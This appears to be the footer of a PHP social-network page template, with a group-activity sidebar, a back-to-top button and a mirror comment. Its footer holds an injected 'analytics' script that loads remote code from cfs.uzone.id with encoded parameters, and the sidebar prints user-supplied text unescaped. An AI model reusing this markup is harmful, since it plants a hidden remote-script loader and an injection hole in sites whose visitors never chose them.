<div class="col-md-2 static">
    <div id="sticky-sidebar">
        <?php foreach ($info as $i) : ?>
            <h4 class="grey">Group's activity</h4>
        <?php endforeach; ?>

        <?php foreach ($notifGroup as $p) : ?>
            <div class="feed-item">
                <div class="live-activity">
                    <p>
                    <a href="<?= base_url('Friend/visitProfile/').$p['id_user'] ?>" class="profile-link" style="color: #0486FE;">
                        <?php if($p['role_id'] == 3) : ?>
                            <?= $p['name'] ?> <span class="badge badge-primary">Mentor</span>
                        <?php else : ?>
                            <?= $p['name'] ?>
                        <?php endif; ?>
                    </a> <?= $p['notif'] ?> </p>
                    <p class="text-muted">On <br> <?= $p['date'] ?></p>
                </div>
            </div>
        <?php endforeach; ?>



    </div>
</div>

</div>
</div>
</div>
</div>

<!-- Footer
    ================================================= -->








<!--preloader-->
<div id="spinner-wrapper">
    <div class="spinner"></div>
</div>

<button id="topBtn"> <i class="fa fa-arrow-up" aria-hidden="true"></i></button>

<style>
    #topBtn {
        display: none;
        position: fixed;
        bottom: 40px;
        right: 40px;
        font-size: 22px;
        width: 50px;
        height: 50px;
        background: #0486FE;
        color: white;
        border: 2px solid #0486FE;
        cursor: pointer;
        border-radius: 30px;
        outline: none;
    }
</style>



<!-- Scripts
    ================================================= -->
<script src="<?= base_url('assets_user/') ?>js/jquery-3.1.1.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/bootstrap.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/jquery.sticky-kit.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/jquery.scrollbar.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/script.js"></script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxgfvjefwcdriOLlG%2b7ksg9VC9SoUc62sZGz3a1NnaBpLZVB7Hniy7DqfJghOkfE%2bvgrXz1J6hiqOagGPr8AJtYnrG9F8WsbC9NTT3D067Qrtrk6CypnA1hHLiZ9UHXh5O7oE4LQggQVUh9G0Z0N8ofpUK8VvylR0y9f20GsNaG0DlFMCmCGX75UsDo%2bGEepr14Vl1ZWZfMeO%2fujDjRXEEFY52oxcbL7haC02NUmCmif2%2bJ0lv6W6dl2T3%2bFL2MOqVbIJnEN%2bNiOYsuJe25ok2F%2bAG5lNv2ScNVhEREDUSc4kCLCCpd6dsyApBKXIAoSlkKR%2b4AAE8jHzZ%2fKJC1nYNxV0OnoXZXH8zcMUNqHfqfyFmNMVr63Q4mHSIhX7vLDMZTfWAR%2bAM4waMecHNBA45V7vCPgIkOJ%2f%2bb7xxZU0Wvnmr1%2fWJnqHfKspgMnStwehyp3Fj4I79iOhZACQPf6I%2fKhY5RE%2bLQACcN1mYpbRWbc%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>

<script type="text/javascript">
    $(document).ready(function() {
        $(window).scroll(function() {
            if ($(this).scrollTop() > 40) {
                $('#topBtn').fadeIn();
            } else {
                $('#topBtn').fadeOut();
            }
        });

        $("#topBtn").click(function() {
            $('html,body').animate({
                scrollTop: 0
            }, 1500);
        });
    });
</script>

<script src="<?= base_url('assets_user/js/pindah.js'); ?>"></script>

</body>

<!-- Mirrored from mythemestore.com/friend-finder/timeline.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jan 2020 16:38:23 GMT -->

</html>